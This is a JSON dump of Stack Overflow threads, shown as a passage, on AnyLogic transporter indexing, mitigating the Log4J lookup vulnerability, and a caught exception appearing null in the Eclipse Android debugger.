</p>\n"},{"tags":["java","simulation","anylogic"],"answers":[{"tags":[],"owner":{"account_id":22333256,"reputation":503,"user_id":16554239,"display_name":"mczandrea"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639571131,"creation_date":1639571131,"answer_id":70363660,"question_id":70361994,"body_markdown":"You can refer to the seized unit as `unit` in some specific places in the SeizeTransporter block.\r\nCheck the small lightbulb at the front of the edit box, to see if this reference can be used. For more info, see https://www.benjamin-schumann.com/blog/2016/2/4/the-magic-lightbulb-and-how-it-can-help-your-anylogic-modelling","title":"Which agent in a population is seized?","body":"<p>You can refer to the seized unit as <code>unit</code> in some specific places in the SeizeTransporter block.\nCheck the small lightbulb at the front of the edit box, to see if this reference can be used. For more info, see <a href=\"https://www.benjamin-schumann.com/blog/2016/2/4/the-magic-lightbulb-and-how-it-can-help-your-anylogic-modelling\" rel=\"nofollow noreferrer\">https://www.benjamin-schumann.com/blog/2016/2/4/the-magic-lightbulb-and-how-it-can-help-your-anylogic-modelling</a></p>\n"}],"owner":{"account_id":19725871,"reputation":59,"user_id":14442490,"display_name":"bluechimp"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":76,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70363660,"answer_count":1,"score":0,"last_activity_date":1639571131,"creation_date":1639563698,"question_id":70361994,"body_markdown":"In Anylogic, I have a fleet of 20 trucks that upon generation (using the `TransporterFleet` block) are placed in a population called `trucks`. These trucks are seized by a resource agent using a `SeizeTransporter` block. How do I find the index of the truck that has been seized? That is, so I can use `trucks(ind).getX()` for example to retrieve the x coordinate of the truck.\r\n\r\nEdit1:\r\nForgot to mention that I have tried using `self.getIndex()`, but that didn&#39;t work as apparently that queries the seize block itself and not the transporter agent. Trying to find the answer, I found using `this.` might be an option, but I&#39;m unsure what `this.` refers to and how to use it.\r\n\r\nThanks","title":"Which agent in a population is seized?","body":"<p>In Anylogic, I have a fleet of 20 trucks that upon generation (using the <code>TransporterFleet</code> block) are placed in a population called <code>trucks</code>. These trucks are seized by a resource agent using a <code>SeizeTransporter</code> block. How do I find the index of the truck that has been seized? That is, so I can use <code>trucks(ind).getX()</code> for example to retrieve the x coordinate of the truck.</p>\n<p>Edit1:\nForgot to mention that I have tried using <code>self.getIndex()</code>, but that didn't work as apparently that queries the seize block itself and not the transporter agent. Trying to find the answer, I found using <code>this.</code> might be an option, but I'm unsure what <code>this.</code> refers to and how to use it.</p>\n<p>Thanks</p>\n"},{"tags":["java","log4j2"],"comments":[{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":0,"creation_date":1639377124,"post_id":70330689,"comment_id":124323973,"body_markdown":"A link to the CVE would help.","body":"A link to the CVE would help."},{"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"score":1,"creation_date":1639377221,"post_id":70330689,"comment_id":124323987,"body_markdown":"*&quot;How do I kill all clever stuff once and for all to prevent any future exploits.&quot;*  - Answer: the only way to be 100% sure that nobody else has made a mistake that makes logging insecure is to implement it yourself.  From the ground up.  Then you will only have yourself to blame.  (In more than one sense ...)","body":"<i>&quot;How do I kill all clever stuff once and for all to prevent any future exploits.&quot;</i>  - Answer: the only way to be 100% sure that nobody else has made a mistake that makes logging insecure is to implement it yourself.  From the ground up.  Then you will only have yourself to blame.  (In more than one sense ...)"},{"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"score":1,"creation_date":1639377563,"post_id":70330689,"comment_id":124324048,"body_markdown":"Here is an intelligible explanation: https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/.  The short version is: message substitution + a clever trick to get log4j to send HTTP request to the hacker&#39;s machine.","body":"Here is an intelligible explanation: <a href=\"https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/\" rel=\"nofollow noreferrer\">news.sophos.com/en-us/2021/12/12/&hellip;</a>.  The short version is: message substitution + a clever trick to get log4j to send HTTP request to the hacker&#39;s machine."},{"owner":{"account_id":13290099,"reputation":109,"user_id":9594828,"display_name":"Ayush Billore"},"score":0,"creation_date":1639377631,"post_id":70330689,"comment_id":124324062,"body_markdown":"CVE-2021-44228 link for reference - http://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228","body":"CVE-2021-44228 link for reference - <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228\" rel=\"nofollow noreferrer\">cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228</a>"},{"owner":{"display_name":"user14215102"},"score":0,"creation_date":1639377664,"post_id":70330689,"comment_id":124324069,"body_markdown":"Or a longer explanation https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/","body":"Or a longer explanation <a href=\"https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/\" rel=\"nofollow noreferrer\">nakedsecurity.sophos.com/2021/12/13/&hellip;</a>"},{"owner":{"account_id":2078462,"reputation":10342,"user_id":2986984,"accept_rate":80,"display_name":"tkruse"},"score":0,"creation_date":1639570747,"post_id":70330689,"comment_id":124381278,"body_markdown":"The right place to ask is https://security.stackexchange.com/","body":"The right place to ask is <a href=\"https://security.stackexchange.com/\">security.stackexchange.com</a>"}],"answers":[{"tags":[],"owner":{"account_id":7172249,"reputation":8197,"user_id":5479362,"accept_rate":48,"display_name":"9ilsdx 9rvj 0lo"},"down_vote_count":2,"up_vote_count":5,"is_accepted":false,"score":3,"last_activity_date":1639570539,"creation_date":1639392150,"answer_id":70333348,"question_id":70330689,"body_markdown":"The only way to prevent vulnaribilites caused by lookups is to disable them completely.\r\n\r\nAccording to log4j2 team, the way to do that is by appending Java parameter \r\n\r\n`-Dlog4j2.formatMsgNoLookups=true`\r\n\r\nThis definitely fixes the ability to call lookups by putting ${...} sequence  s in the user input (like in URLs that are logged).\r\n\r\nUnfortunately, the lookups are applied to the logged sequence, even if you use parameters or log exception stack traces. The lookups sequeces in your code are not dangerous, because they are controllable. But those that come from user are not predictable. If you log &#39;wrong username: xxx&#39;, you have no idea, what the user can type to exploit another vulnaribility.\r\n\r\nHowever, you can&#39;t be sure there are no other grave errors in the framework, so switching to other logging framework is reasonable.\r\n\r\nA good candidate is [Logback][1], which is started by the original author of the Log4j. The developer states clearly, his framework has nothing to do with the security issues introduced in Log4j2:\r\n\r\n&gt; Unless specified otherwise, when we say log4j we mean log4j 1.x. We\r\n&gt; should also like to emphasize that logback is unrelated to log4j 2.x.\r\n&gt; It does not share code nor vulnerabilities with log4j 2.x. \r\n\r\nThe bug [is apparently fixed][2] in the version 2.16.0, however it addresses only that particular vulnaribility, and the dangerous lookup feature was not removed.\r\n\r\nAccording to the [Sophos Report][3], \r\n\r\n&gt; The updated version of Log4j still supports the potentially dangerous\r\n&gt; what-you-see-is-not-what-you-get system of string “lookups”, but\r\n&gt; network-based JNDI connections, whether on the same machine or\r\n&gt; reaching out to somewhere else, are no longer enabled by default.\r\n\r\nIn other words, log4j2 still remains unsecure, but not as ridiculously insecure as previously.\r\n\r\n\r\n  [1]: http://logback.qos.ch/\r\n  [2]: https://logging.apache.org/log4j/2.x/security.html\r\n  [3]: https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/","title":"How to avoid Log4J exploit?","body":"<p>The only way to prevent vulnaribilites caused by lookups is to disable them completely.</p>\n<p>According to log4j2 team, the way to do that is by appending Java parameter</p>\n<p><code>-Dlog4j2.formatMsgNoLookups=true</code></p>\n<p>This definitely fixes the ability to call lookups by putting ${...} sequence  s in the user input (like in URLs that are logged).</p>\n<p>Unfortunately, the lookups are applied to the logged sequence, even if you use parameters or log exception stack traces. The lookups sequeces in your code are not dangerous, because they are controllable. But those that come from user are not predictable. If you log 'wrong username: xxx', you have no idea, what the user can type to exploit another vulnaribility.</p>\n<p>However, you can't be sure there are no other grave errors in the framework, so switching to other logging framework is reasonable.</p>\n<p>A good candidate is <a href=\"http://logback.qos.ch/\" rel=\"nofollow noreferrer\">Logback</a>, which is started by the original author of the Log4j. The developer states clearly, his framework has nothing to do with the security issues introduced in Log4j2:</p>\n<blockquote>\n<p>Unless specified otherwise, when we say log4j we mean log4j 1.x. We\nshould also like to emphasize that logback is unrelated to log4j 2.x.\nIt does not share code nor vulnerabilities with log4j 2.x.</p>\n</blockquote>\n<p>The bug <a href=\"https://logging.apache.org/log4j/2.x/security.html\" rel=\"nofollow noreferrer\">is apparently fixed</a> in the version 2.16.0, however it addresses only that particular vulnaribility, and the dangerous lookup feature was not removed.</p>\n<p>According to the <a href=\"https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/\" rel=\"nofollow noreferrer\">Sophos Report</a>,</p>\n<blockquote>\n<p>The updated version of Log4j still supports the potentially dangerous\nwhat-you-see-is-not-what-you-get system of string “lookups”, but\nnetwork-based JNDI connections, whether on the same machine or\nreaching out to somewhere else, are no longer enabled by default.</p>\n</blockquote>\n<p>In other words, log4j2 still remains unsecure, but not as ridiculously insecure as previously.</p>\n"},{"tags":[],"owner":{"account_id":1555751,"reputation":35615,"user_id":1446916,"display_name":"Remko Popma"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1639400095,"creation_date":1639400095,"answer_id":70335009,"question_id":70330689,"body_markdown":"For security issues like this one it makes sense to keep the up to date information in a single place. \r\n\r\nPlease refer to the official Log4j information about this vulnerability here: https://logging.apache.org/log4j/2.x/security.html\r\nThe document states several mitigation measures applicable for different versions of Log4j. \r\n\r\nI realize that in general the StackOverflow convention is to have explicit steps and examples in the answer here on StackOverflow, rather than link to external documentation, but  I believe that sensitive security flaws should be an exception. ","title":"How to avoid Log4J exploit?","body":"<p>For security issues like this one it makes sense to keep the up to date information in a single place.</p>\n<p>Please refer to the official Log4j information about this vulnerability here: <a href=\"https://logging.apache.org/log4j/2.x/security.html\" rel=\"nofollow noreferrer\">https://logging.apache.org/log4j/2.x/security.html</a>\nThe document states several mitigation measures applicable for different versions of Log4j.</p>\n<p>I realize that in general the StackOverflow convention is to have explicit steps and examples in the answer here on StackOverflow, rather than link to external documentation, but  I believe that sensitive security flaws should be an exception.</p>\n"}],"owner":{"account_id":1032845,"reputation":3336,"user_id":2698167,"accept_rate":33,"display_name":"Tuntable"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1271,"favorite_count":0,"down_vote_count":0,"up_vote_count":5,"closed_date":1639570434,"answer_count":2,"score":5,"last_activity_date":1639570539,"creation_date":1639376830,"question_id":70330689,"body_markdown":"There is a serious security flaw in Log4J that has apparently been patched.  But I have not found an intelligible explanation as to how there could even be a security flaw in a logging framework.\r\n\r\nIt seems to have something to do with &quot;Lookups&quot;.\r\nhttps://logging.apache.org/log4j/2.x/manual/lookups.html\r\n\r\nBut that is in a config file, not a log file that could be injected into?\r\n\r\nQuestion.  How do I kill all clever stuff once and for all to prevent any future exploits?  I just want logging.\r\n\r\nIt smells like I need to remove any &quot;$&quot; signs but that is just a guess.  (One should also remove any \\ns to avoid log file spoofing. I always write a very simple wrapper for the logging to be able to do this sort of thing.)\r\n\r\n(I have a very simple shim that all log messages go through, so it is easy for me to remove all &quot;$&quot;s that are not in format strings.)","title":"How to avoid Log4J exploit?","body":"<p>There is a serious security flaw in Log4J that has apparently been patched.  But I have not found an intelligible explanation as to how there could even be a security flaw in a logging framework.</p>\n<p>It seems to have something to do with &quot;Lookups&quot;.\n<a href=\"https://logging.apache.org/log4j/2.x/manual/lookups.html\" rel=\"nofollow noreferrer\">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p>\n<p>But that is in a config file, not a log file that could be injected into?</p>\n<p>Question.  How do I kill all clever stuff once and for all to prevent any future exploits?  I just want logging.</p>\n<p>It smells like I need to remove any &quot;$&quot; signs but that is just a guess.  (One should also remove any \\ns to avoid log file spoofing. I always write a very simple wrapper for the logging to be able to do this sort of thing.)</p>\n<p>(I have a very simple shim that all log messages go through, so it is easy for me to remove all &quot;$&quot;s that are not in format strings.)</p>\n"},{"tags":["java","android","eclipse","debugging","null"],"comments":[{"owner":{"account_id":21877,"reputation":36380,"user_id":53501,"accept_rate":59,"display_name":"Rich"},"score":2,"creation_date":1326818823,"post_id":8898404,"comment_id":11127756,"body_markdown":"Why are you catching a Throwable instead of an Exception?","body":"Why are you catching a Throwable instead of an Exception?"},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326818997,"post_id":8898404,"comment_id":11127805,"body_markdown":"I have tried Throwable, Exception, RuntimeException. The result is the same.","body":"I have tried Throwable, Exception, RuntimeException. The result is the same."},{"owner":{"account_id":953149,"reputation":177303,"user_id":978917,"accept_rate":86,"display_name":"ruakh"},"score":2,"creation_date":1326819054,"post_id":8898404,"comment_id":11127835,"body_markdown":"I never use the debugger, myself, but from what I&#39;ve seen when other people use it, what it shows for a given object seems to be the result of calling `String.valueOf(...)` on that object. So if the caught exception&#39;s `toString()` method returns either `null` or `&#39;null&#39;`, then the debugger can give the false impression that the caught exception itself is `null`.","body":"I never use the debugger, myself, but from what I&#39;ve seen when other people use it, what it shows for a given object seems to be the result of calling <code>String.valueOf(...)</code> on that object. So if the caught exception&#39;s <code>toString()</code> method returns either <code>null</code> or <code>&#39;null&#39;</code>, then the debugger can give the false impression that the caught exception itself is <code>null</code>."},{"owner":{"account_id":146265,"reputation":4244,"user_id":356615,"accept_rate":91,"display_name":"bschultz"},"score":0,"creation_date":1326819095,"post_id":8898404,"comment_id":11127857,"body_markdown":"What is LogCat saying when your get the exception?","body":"What is LogCat saying when your get the exception?"},{"owner":{"account_id":21877,"reputation":36380,"user_id":53501,"accept_rate":59,"display_name":"Rich"},"score":0,"creation_date":1326819177,"post_id":8898404,"comment_id":11127886,"body_markdown":"you sure about that?  Do you know for a fact that the exception is null, or is this an assumption based on some runtime factors?  What if you change the toast code to a simple Log.d(&quot;&quot;, e.getMessage())?","body":"you sure about that?  Do you know for a fact that the exception is null, or is this an assumption based on some runtime factors?  What if you change the toast code to a simple Log.d(&quot;&quot;, e.getMessage())?"},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326819226,"post_id":8898404,"comment_id":11127907,"body_markdown":"I am not trying, I am getting a breakpoint. And where it is, is written in the code. Yes, I am using the debugger. I have mentioned the debugger twice, haven&#39;t I? Forgive me, if I am not expressing myself clearly enough.","body":"I am not trying, I am getting a breakpoint. And where it is, is written in the code. Yes, I am using the debugger. I have mentioned the debugger twice, haven&#39;t I? Forgive me, if I am not expressing myself clearly enough."},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326819347,"post_id":8898404,"comment_id":11127943,"body_markdown":"@ruakh. No. The debugger inspects variables BEFORE fulfilling the line it breaks on. And it is e, that is null, not e.ToString(). BTW, that would be the same problem - the error without any message.","body":"@ruakh. No. The debugger inspects variables BEFORE fulfilling the line it breaks on. And it is e, that is null, not e.ToString(). BTW, that would be the same problem - the error without any message."},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326819818,"post_id":8898404,"comment_id":11128172,"body_markdown":"@Pheonixblade9. I usually try to manage my problems myself. So, I ask more difficult questions. As a result, I do not get answers often. You made me to recognize an &quot;answer&quot; that was not a real answer.","body":"@Pheonixblade9. I usually try to manage my problems myself. So, I ask more difficult questions. As a result, I do not get answers often. You made me to recognize an &quot;answer&quot; that was not a real answer."},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326820774,"post_id":8898404,"comment_id":11128538,"body_markdown":"@Pheonixblade9. I haven&#39;t noticed that somebody even plused, let alone checked my &quot;thoughts that could be useful&quot;. But ok, I&#39;ll try to be the kindest one. :-)","body":"@Pheonixblade9. I haven&#39;t noticed that somebody even plused, let alone checked my &quot;thoughts that could be useful&quot;. But ok, I&#39;ll try to be the kindest one. :-)"},{"owner":{"account_id":294637,"reputation":12207,"user_id":598637,"accept_rate":97,"display_name":"Codeman"},"score":0,"creation_date":1326820859,"post_id":8898404,"comment_id":11128578,"body_markdown":"Okay.  Back on topic, the breakpoint is likely null because that line hasn&#39;t been evaluated yet.  Try putting a dummy line of code below, and setting the breakpoint there.  It should work for you.","body":"Okay.  Back on topic, the breakpoint is likely null because that line hasn&#39;t been evaluated yet.  Try putting a dummy line of code below, and setting the breakpoint there.  It should work for you."},{"owner":{"account_id":1055494,"reputation":10205,"user_id":1058319,"accept_rate":98,"display_name":"Adel Boutros"},"score":0,"creation_date":1326821317,"post_id":8898404,"comment_id":11128736,"body_markdown":"@Pheonixblade9 your solution is inferring that eclipse is bugged in a so obvious way which is totally ridiculous!! when a line is reached, all previous related lines have been evaluated","body":"@Pheonixblade9 your solution is inferring that eclipse is bugged in a so obvious way which is totally ridiculous!! when a line is reached, all previous related lines have been evaluated"},{"owner":{"account_id":294637,"reputation":12207,"user_id":598637,"accept_rate":97,"display_name":"Codeman"},"score":0,"creation_date":1326821392,"post_id":8898404,"comment_id":11128771,"body_markdown":"Yes.  The previous lines are evaluated.  The current line is not until you step through it.","body":"Yes.  The previous lines are evaluated.  The current line is not until you step through it."},{"owner":{"account_id":953149,"reputation":177303,"user_id":978917,"accept_rate":86,"display_name":"ruakh"},"score":0,"creation_date":1326822098,"post_id":8898404,"comment_id":11129007,"body_markdown":"@Gangnus: I think you must have misunderstood what I wrote.","body":"@Gangnus: I think you must have misunderstood what I wrote."},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326835237,"post_id":8898404,"comment_id":11133017,"body_markdown":"@Pheonixblade9. I&#39;ll never get there. The Toast line is causing NullPointerException, because I am trying to use a null object.","body":"@Pheonixblade9. I&#39;ll never get there. The Toast line is causing NullPointerException, because I am trying to use a null object."},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326835402,"post_id":8898404,"comment_id":11133058,"body_markdown":"@Adel Boutros. Excuse me, but the whole problem coud arise only because some my error causes error in Android, Eclipse or its debugger. Whithout error in some of them e wouldn&#39;t become null. And Eclipse, expecially debugger, is bugged enough, I am afraid.","body":"@Adel Boutros. Excuse me, but the whole problem coud arise only because some my error causes error in Android, Eclipse or its debugger. Whithout error in some of them e wouldn&#39;t become null. And Eclipse, expecially debugger, is bugged enough, I am afraid."},{"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"score":0,"creation_date":1326835693,"post_id":8898404,"comment_id":11133142,"body_markdown":"@ruakh. Sorry. But it is the same - When I see &quot;inspect&quot; on object, I do not see its &quot;toString&quot; result, but the whole structure of the instance with values. And here I see naked null, as is seen on uncreated objects. And after a step over toast I get the NullPointerException...","body":"@ruakh. Sorry. But it is the same - When I see &quot;inspect&quot; on object, I do not see its &quot;toString&quot; result, but the whole structure of the instance with values. And here I see naked null, as is seen on uncreated objects. And after a step over toast I get the NullPointerException..."},{"owner":{"account_id":252759,"reputation":19874,"user_id":531021,"display_name":"JesusFreke"},"score":0,"creation_date":1326844777,"post_id":8898404,"comment_id":11135526,"body_markdown":"What device are you seeing this behavior on? What version of android is it running? I just wrote a quick example app that attempts to throw a null value, and an NPE occurred at the throw statement (like it should).","body":"What device are you seeing this behavior on? What version of android is it running? I just wrote a quick example app that attempts to throw a null value, and an NPE occurred at the throw statement (like it should)."}],"answers":[{"tags":[],"owner":{"account_id":1055494,"reputation":10205,"user_id":1058319,"accept_rate":98,"display_name":"Adel Boutros"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1326819705,"creation_date":1326819335,"answer_id":8898555,"question_id":8898404,"body_markdown":"**Android** does not always throws exception in a `Throwable`. It actually drives all the exceptions to the `catLog`. There you will find details of your exceptions even if in the catch block your **exception** is `null`.\r\n\r\nYou can easily access the catlog console from eclipse and filter to view the errors only\r\n\r\n**UPDATE:**\r\n\r\nYour breakpoint should be inside the catch block","title":"Caught Throwable or Exception is null","body":"<p><strong>Android</strong> does not always throws exception in a <code>Throwable</code>. It actually drives all the exceptions to the <code>catLog</code>. There you will find details of your exceptions even if in the catch block your <strong>exception</strong> is <code>null</code>.</p>\n\n<p>You can easily access the catlog console from eclipse and filter to view the errors only</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>Your breakpoint should be inside the catch block</p>\n"},{"tags":[],"owner":{"account_id":916642,"reputation":15473,"user_id":949300,"accept_rate":65,"display_name":"user949300"},"down_vote_count":2,"up_vote_count":4,"is_accepted":false,"score":2,"last_activity_date":1326821875,"creation_date":1326821875,"answer_id":8899123,"question_id":8898404,"body_markdown":"If the exception you caught was a NullPointerException, the getMessage() method returns &quot;null&quot; which may be confusing.  I know that this has sometimes confused me!\r\n\r\nIn the debugger, you should be able to select e and see a type and its fields.  Also, another way to debug when things get really confusing is to go\r\n\r\n     e.printStackTrace();\r\n\r\n(note - I&#39;m not an Android guru so if this works differently on Android somebody please comment!)\r\n","title":"Caught Throwable or Exception is null","body":"<p>If the exception you caught was a NullPointerException, the getMessage() method returns \"null\" which may be confusing.  I know that this has sometimes confused me!</p>\n\n<p>In the debugger, you should be able to select e and see a type and its fields.  Also, another way to debug when things get really confusing is to go</p>\n\n<pre><code> e.printStackTrace();\n</code></pre>\n\n<p>(note - I'm not an Android guru so if this works differently on Android somebody please comment!)</p>\n"},{"tags":[],"owner":{"account_id":252759,"reputation":19874,"user_id":531021,"display_name":"JesusFreke"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1326837054,"creation_date":1326836287,"answer_id":8902072,"question_id":8898404,"body_markdown":"Have you verified whether `e` is actually null or not? I.e. by adding something like `if (e == null) Log.d(&quot;Exception is null&quot;)`. I would then check if the log statement gets triggered both during normal execution and while debugging. If the results are different between the two, it would indicate a VM bug (unlikely, but possible). If the message doesn&#39;t get triggered in either case, then it&#39;s likely a debugger issue.\r\n\r\nA few thoughts on further things you can try to debug the issue:\r\n\r\n- Try something like jdb and see if you get the same behaviour\r\n\r\n- You could get a dump  of the jdwp communications between the debugger and the device, and see what&#39;s going on at that level. Maybe use wireshark or tcpdump and grab the data going over the usb bus to the device.\r\n \r\n- You could try adding some debug statements to dalvik itself. E.g. grab a copy of AOSP and build an emulator image, and then add some debugging statements to dalvik to try and track down what&#39;s going on.\r\n\r\n- You could attempt to do some sort of scripted jdwp session with the device\r\n\r\n- You could look at the bytecode (baksmali/dexdump/dedexer), to see if anything looks funny ","title":"Caught Throwable or Exception is null","body":"<p>Have you verified whether <code>e</code> is actually null or not? I.e. by adding something like <code>if (e == null) Log.d(\"Exception is null\")</code>. I would then check if the log statement gets triggered both during normal execution and while debugging. If the results are different between the two, it would indicate a VM bug (unlikely, but possible). If the message doesn't get triggered in either case, then it's likely a debugger issue.</p>\n\n<p>A few thoughts on further things you can try to debug the issue:</p>\n\n<ul>\n<li><p>Try something like jdb and see if you get the same behaviour</p></li>\n<li><p>You could get a dump  of the jdwp communications between the debugger and the device, and see what's going on at that level. Maybe use wireshark or tcpdump and grab the data going over the usb bus to the device.</p></li>\n<li><p>You could try adding some debug statements to dalvik itself. E.g. grab a copy of AOSP and build an emulator image, and then add some debugging statements to dalvik to try and track down what's going on.</p></li>\n<li><p>You could attempt to do some sort of scripted jdwp session with the device</p></li>\n<li><p>You could look at the bytecode (baksmali/dexdump/dedexer), to see if anything looks funny </p></li>\n</ul>\n"},{"tags":[],"owner":{"account_id":1445423,"reputation":19,"user_id":1364099,"display_name":"edZilla"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1340190163,"creation_date":1340190163,"answer_id":11118156,"question_id":8898404,"body_markdown":"I know this question was posted a while ago, and many times too! I fell into this trap yesterday and I thought I&#39;ll post what I found.\r\n\r\nProblem definition: I used the following code\r\n\r\n    public class myAppActivity extends Activity\r\n    {\r\n       /** Called when the activity is first created. */\r\n       @Override\r\n       public void onCreate(Bundle savedInstanceState)\r\n       {\r\n          super.onCreate(savedInstanceState);\r\n          setContentView(R.layout.main);\r\n          try { -- lots of code -- }\r\n          catch (Exception ex) {\r\n              Log.e (&quot;eTutorPrism Error&quot;, &quot;Caught this exception &quot; + ex);\r\n              ex.printStackTrace();\r\n          }\r\n       }\r\n    }\r\n\r\n    Symptom was that &#39;ex&#39; was always null and resume will give NullPointerException, although the actual exception was an IllegalArgumentException in a call made into another class from the code above.\r\n\r\nISSUE: onCreate() code does not display the exception caught. instead it shows exception = null.\r\n\r\nSolution: do NOT use too much processing in onCreate(). Move as much as possible to another thread. So I changed the code to look like the following. voila, it works!!! I can see the actual exception displayed in the Logcat.\r\n\r\n    public class eTutorPrismAppActivity extends Activity\r\n    {\r\n       /** Called when the activity is first created. */\r\n       @Override\r\n       public void onCreate(Bundle savedInstanceState)\r\n       {\r\n           super.onCreate(savedInstanceState);\r\n           setContentView(R.layout.main);\r\n        \r\n           eTutorPrismTest myTest = new eTutorPrismTest (getApplicationContext());\r\n           myTest.start();\r\n       }\r\n    }\r\n\r\n    class eTutorPrismTest extends Thread\r\n    {\r\n       private Context m_AppContext = null;\r\n\t\r\n       public eTutorPrismTest (Context appContext)\r\n       {\r\n          m_AppContext = appContext;\r\n       }\r\n\t\r\n       public void run ()\r\n       {   \r\n          -- lots of code that needs appContext --\r\n       }\r\n    }\r\n","title":"Caught Throwable or Exception is null","body":"<p>I know this question was posted a while ago, and many times too! I fell into this trap yesterday and I thought I'll post what I found.</p>\n\n<p>Problem definition: I used the following code</p>\n\n<pre><code>public class myAppActivity extends Activity\n{\n   /** Called when the activity is first created. */\n   @Override\n   public void onCreate(Bundle savedInstanceState)\n   {\n      super.onCreate(savedInstanceState);\n      setContentView(R.layout.main);\n      try { -- lots of code -- }\n      catch (Exception ex) {\n          Log.e (\"eTutorPrism Error\", \"Caught this exception \" + ex);\n          ex.printStackTrace();\n      }\n   }\n}\n\nSymptom was that 'ex' was always null and resume will give NullPointerException, although the actual exception was an IllegalArgumentException in a call made into another class from the code above.\n</code></pre>\n\n<p>ISSUE: onCreate() code does not display the exception caught. instead it shows exception = null.</p>\n\n<p>Solution: do NOT use too much processing in onCreate(). Move as much as possible to another thread. So I changed the code to look like the following. voila, it works!!! I can see the actual exception displayed in the Logcat.</p>\n\n<pre><code>public class eTutorPrismAppActivity extends Activity\n{\n   /** Called when the activity is first created. */\n   @Override\n   public void onCreate(Bundle savedInstanceState)\n   {\n       super.onCreate(savedInstanceState);\n       setContentView(R.layout.main);\n\n       eTutorPrismTest myTest = new eTutorPrismTest (getApplicationContext());\n       myTest.start();\n   }\n}\n\nclass eTutorPrismTest extends Thread\n{\n   private Context m_AppContext = null;\n\n   public eTutorPrismTest (Context appContext)\n   {\n      m_AppContext = appContext;\n   }\n\n   public void run ()\n   {   \n      -- lots of code that needs appContext --\n   }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4812584,"reputation":11,"user_id":3885622,"display_name":"Matthew"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1406579320,"creation_date":1406579320,"answer_id":25003767,"question_id":8898404,"body_markdown":"I am unsure of what causes this -- it could be an Eclipse bug as stated earlier.  Regardless of the cause, I did find a workaround that seems to work.  I hope it is useful to others as well.\r\n\r\nAfter the exception is caught, assign it to another variable.  The assigned variable should contain the correct Exception in the debugger.\r\n\r\n    SpecificException assignedVar = null;\r\n    try {\r\n        ...\r\n    }\r\n    catch (SpecificException exc) {\r\n        assignedVar = exc; // &lt;-- exc comes up null in the debugger, but assignedVar will be the correct object.\r\n    }\r\n\r\nHope this works for others as a workaround.","title":"Caught Throwable or Exception is null","body":"<p>I am unsure of what causes this -- it could be an Eclipse bug as stated earlier.  Regardless of the cause, I did find a workaround that seems to work.  I hope it is useful to others as well.</p>\n\n<p>After the exception is caught, assign it to another variable.  The assigned variable should contain the correct Exception in the debugger.</p>\n\n<pre><code>SpecificException assignedVar = null;\ntry {\n    ...\n}\ncatch (SpecificException exc) {\n    assignedVar = exc; // &lt;-- exc comes up null in the debugger, but assignedVar will be the correct object.\n}\n</code></pre>\n\n<p>Hope this works for others as a workaround.</p>\n"}],"owner":{"account_id":368447,"reputation":24110,"user_id":715269,"accept_rate":60,"display_name":"Gangnus"},"comment_count":17,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":16119,"favorite_count":0,"down_vote_count":0,"up_vote_count":6,"answer_count":5,"score":6,"last_activity_date":1639569902,"creation_date":1326818699,"question_id":8898404,"body_markdown":"A similar question was asked here for two times and never there was any answer. Or the answer was: &quot;it is impossible!&quot; Sorry, it is possible too much:    \r\n\r\n    try{\r\n        ...\r\n        // the line that causes the error\r\n        LinearLayout cell = (LinearLayout) inflater.inflate(R.layout.channels_list_cell, column);\r\n        ...\r\n    }\r\n    catch(Throwable e){\r\n      \tToast.makeText(this, e.toString(), Toast.LENGTH_LONG).show(); &lt; breakpoint here!\r\n    }\r\n\r\nAt the breakpoint e is null. How can I seek for the error, please? Very possibly it is not the problem of java or Android, but of the Eclipse debugger, that itself needs debugging badly. But what have I to do, except changing to a different IDE? 